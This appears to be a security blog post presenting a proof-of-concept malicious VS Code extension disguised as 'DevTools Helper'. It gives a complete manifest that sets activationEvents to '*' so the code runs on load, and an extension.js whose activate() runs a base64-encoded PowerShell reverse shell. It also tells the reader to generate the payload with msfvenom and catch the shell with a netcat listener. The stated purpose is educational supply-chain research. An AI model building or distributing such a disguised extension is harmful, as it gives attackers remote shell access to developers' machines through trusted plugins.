Evil VSIX extension

📅 16 Jun 2026 ·
WindowsReverse ShellExtension

Evil VSIX Extension is a VSIX extension developed as a proof of concept to evaluate security risks in development environments. It demonstrates code execution techniques using VS Code extensions and enables the analysis of attack vectors related to the software supply chain and trust in third-party plugins.

Creation

The following project structure is created: 

.
├── [Content_Types].xml
└── extension/
    ├── extension.js
    └── package.js

In the extension/package.js file 

{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}

Make sure you have the correct version in the version parameter and that activationEvents is set to ["*"] so that all the code executes.

In the extension/extension.js file. 

const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e <BASE64_REVERSE_SHELL>');
}
exports.deactivate = function() {}

To generate the payload, you can use the msfvenom tool; just make sure to encode the parameter in base64.

Usage

Set up a listener using netcat.

Simply run it on the system using VS Code.

How it works

A VSIX extension is a package used by Visual Studio Code to distribute additional functionality. When an extension is installed, VS Code interprets its configuration file and loads the JavaScript code associated with the extension.

This behavior is legitimate and part of the editor's normal operation. However, a malicious extension can exploit VS Code's trust model to execute arbitrary code on the victim's system.

This project demonstrates how a seemingly harmless extension can use automatic activation events to execute code as soon as VS Code loads it.

Since extensions run with the current user's permissions, they can interact with the operating system, access local files, establish network connections, or execute external processes.

This type of technique is typically classified as a supply chain attack, as the user trusts a seemingly legitimate extension that ends up performing unauthorized actions.

The presented proof of concept is intended for educational and research purposes, helping to understand the risks associated with installing third-party extensions in development environments.

The execution flow is as follows:

  1. The user installs the .vsix extension in Visual Studio Code.
  2. VS Code reads the package.json file to identify the extension's entry point.
  3. Events defined in activationEvents determine when the extension should load.
  4. When the activation condition is met, VS Code executes the extension.js file.
  5. The activate() function runs automatically with the current user's permissions.
  6. The extension's code can interact with local resources and perform actions defined by the developer.
  7. Execution takes place within a context considered trusted by both the user and the editor itself.

Use this only against targets for which you have explicit authorization.
